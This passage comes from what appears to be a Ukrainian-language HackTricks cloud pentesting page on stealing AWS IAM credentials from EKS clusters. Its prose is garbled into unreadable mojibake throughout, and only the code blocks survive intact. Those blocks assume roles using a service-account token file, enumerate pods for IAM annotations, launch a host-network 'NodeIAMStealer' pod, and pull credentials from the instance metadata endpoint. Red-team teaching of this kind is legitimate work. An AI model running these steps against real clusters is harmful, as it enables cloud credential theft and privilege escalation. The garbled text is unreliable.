kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
–î–ª—è **–æ—Ç—Ä–∏–º–∞–Ω–Ω—è aws –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–æ–∫–µ–Ω–∞** –∑ `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` –≤–∏–∫–æ–Ω–∞–π—Ç–µ:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
–Ø–∫ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –∫–ª–∞—Å—Ç–µ—Ä K8s, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–± –∑ —Ü—ñ—î—é –∞–Ω–æ—Ç–∞—Ü—ñ—î—é**, —â–æ–± **–ø—ñ–¥–Ω—è—Ç–∏—Å—è –Ω–∞ AWS**. –î–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Å—Ç–æ **–≤–∏–∫–æ–Ω–∞–π—Ç–µ/—Å—Ç–≤–æ—Ä—ñ—Ç—å** –ø–æ—Ç—ñ–∫, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–¥–∏–Ω –∑ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ IAM**, —ñ –≤–∫—Ä–∞–¥—ñ—Ç—å —Ç–æ–∫–µ–Ω.

–ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ—Ç–æ–∫—É, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, —Ç–∞–∫—ñ —è–∫ **AWS\_ROLE\_ARN** —Ç–∞ **AWS\_WEB\_IDENTITY\_TOKEN**.
{% endhint %}

{% hint style="danger" %}
–Ü–Ω–æ–¥—ñ **–ø–æ–ª—ñ—Ç–∏–∫–∞ –¥–æ–≤—ñ—Ä–∏ —Ä–æ–ª—ñ** –º–æ–∂–µ –±—É—Ç–∏ **–ø–æ–≥–∞–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞**, —ñ –∑–∞–º—ñ—Å—Ç—å –Ω–∞–¥–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É AssumeRole –æ—á—ñ–∫—É–≤–∞–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏, –≤–æ–Ω–∞ –Ω–∞–¥–∞—î –π–æ–≥–æ **–≤—Å—ñ–º –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–∞–º —Å–ª—É–∂–±**. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –∑–¥–∞—Ç–Ω—ñ –Ω–∞–ø–∏—Å–∞—Ç–∏ –∞–Ω–æ—Ç–∞—Ü—ñ—é –Ω–∞ –∫–µ—Ä–æ–≤–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–æ–ª—ñ.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### –ó–Ω–∞–π–¥—ñ—Ç—å –ü–æ—Ç–æ–∫–∏ —Ç–∞ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–± –∑ —Ä–æ–ª—è–º–∏ IAM –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ

–¶–µ —Å—Ü–µ–Ω–∞—Ä—ñ–π –¥–ª—è **–ª–µ–≥–∫–æ—ó —ñ—Ç–µ—Ä–∞—Ü—ñ—ó –ø–æ –≤—Å—ñ—Ö –ø–æ—Ç–æ–∫–∞—Ö —Ç–∞ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±**, **—à—É–∫–∞—é—á–∏** —Ü—é **–∞–Ω–æ—Ç–∞—Ü—ñ—é**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### –†–æ–ª—å IAM –≤—É–∑–ª–∞

–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ä–æ–∑–¥—ñ–ª –±—É–≤ –ø—Ä–∏—Å–≤—è—á–µ–Ω–∏–π —Ç–æ–º—É, —è–∫ –≤–∫—Ä–∞—Å—Ç–∏ —Ä–æ–ª—ñ IAM –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—ñ–¥–ø—Ä–æ–≥—Ä–∞–º, –∞–ª–µ —Å–ª—ñ–¥ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ **–í—É–∑–æ–ª** –∫–ª–∞—Å—Ç–µ—Ä–∞ K8s –±—É–¥–µ **–µ–∫–∑–µ–º–ø–ª—è—Ä–æ–º –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ö–º–∞—Ä–∏**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –π–º–æ–≤—ñ—Ä–Ω–æ, —â–æ **–í—É–∑–æ–ª –±—É–¥–µ –º–∞—Ç–∏ –Ω–æ–≤—É —Ä–æ–ª—å IAM, —è–∫—É –º–æ–∂–Ω–∞ –≤–∫—Ä–∞—Å—Ç–∏** (_–∑–∞—É–≤–∞–∂—Ç–µ, —â–æ –∑–∞–∑–≤–∏—á–∞–π –≤—Å—ñ –≤—É–∑–ª–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞ K8s –º–∞—Ç–∏–º—É—Ç—å –æ–¥–Ω–∞–∫–æ–≤—É —Ä–æ–ª—å IAM, —Ç–æ–º—É –º–æ–∂–µ –±—É—Ç–∏ –Ω–µ –≤–∞—Ä—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –∫–æ–∂–µ–Ω –≤—É–∑–æ–ª_).

–û–¥–Ω–∞–∫ —î –≤–∞–∂–ª–∏–≤–∞ –≤–∏–º–æ–≥–∞ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –∑ –≤—É–∑–ª–∞, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ –Ω–∞ –≤—É–∑–ª—ñ (—Å–µ–∞–Ω—Å ssh?) –∞–±–æ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –º–∞—Ç–∏ —Ç—É —Å–∞–º—É –º–µ—Ä–µ–∂—É:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### –í–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω IAM-—Ä–æ–ª—ñ

–†–∞–Ω—ñ—à–µ –º–∏ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–∏, —è–∫ **–ø—Ä–∏–∫—Ä—ñ–ø–ª—é–≤–∞—Ç–∏ —Ä–æ–ª—ñ IAM –¥–æ –∫–∞–ø—Å—É–ª** –∞–±–æ –Ω–∞–≤—ñ—Ç—å —è–∫ **–≤–∏–±—Ä–∞—Ç–∏—Å—è –Ω–∞ –≤—É–∑–æ–ª, —â–æ–± –≤–∫—Ä–∞—Å—Ç–∏ —Ä–æ–ª—å IAM**, —è–∫—É –º–∞—î –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω—É –¥–æ —Å–µ–±–µ –µ–∫–∑–µ–º–ø–ª—è—Ä.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, —â–æ–± **–≤–∫—Ä–∞—Å—Ç–∏** –≤–∞—à—ñ –Ω–æ–≤—ñ, –≤–∞–∂–∫–æ –∑–¥–æ–±—É—Ç—ñ **–ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Ä–æ–ª—ñ IAM**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
